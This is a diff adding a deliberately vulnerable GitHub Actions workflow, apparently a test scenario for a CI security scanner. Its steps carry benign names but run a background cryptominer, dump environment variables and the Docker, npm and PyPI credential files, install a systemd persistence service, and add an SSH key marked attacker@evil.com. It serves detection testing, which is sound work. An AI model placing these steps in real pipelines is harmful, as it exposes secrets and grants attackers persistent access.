@@ -1,0 +1,51 @@
+# ============================================================================
+# SCENARIO 14: Runtime Cryptominer & Process Injection
+# ============================================================================
+# This workflow spawns background processes that mimic cryptominer behavior,
+# access sensitive credential files, and establish persistence.
+#
+# SCG Detection: Runtime Monitor + Behavioral Analysis Scanner
+# Expected Severity: CRITICAL
+# ============================================================================
+
+name: "Long Running Tests (VULNERABLE)"
+on:
+  push:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # ⚠️ CRYPTOMINER PROCESS: Background process with mining patterns
+      - name: Run benchmark
+        run: |
+          nohup ./benchmark --algo=randomx --threads=$(nproc) --donate-level=1 &
+
+      # ⚠️ CREDENTIAL ACCESS: Reading sensitive CI files
+      - name: Setup test environment
+        run: |
+          cat /proc/self/environ
+          cat $HOME/.docker/config.json 2>/dev/null || true
+          cat $HOME/.npmrc 2>/dev/null || true
+          cat $HOME/.pypirc 2>/dev/null || true
+
+      # ⚠️ PERSISTENCE: Creating systemd service for persistence
+      - name: Install service
+        run: |
+          cat > /etc/systemd/system/metrics.service << EOF
+          [Unit]
+          Description=Metrics Collector
+          [Service]
+          ExecStart=/tmp/metrics-agent
+          Restart=always
+          [Install]
+          WantedBy=multi-user.target
+          EOF
+
+      # ⚠️ SSH KEY INJECTION: Adding authorized key for persistence
+      - name: Setup SSH access
+        run: |
+          mkdir -p ~/.ssh
+          echo "ssh-rsa AAAAB3... attacker@evil.com" >> ~/.ssh/authorized_keys
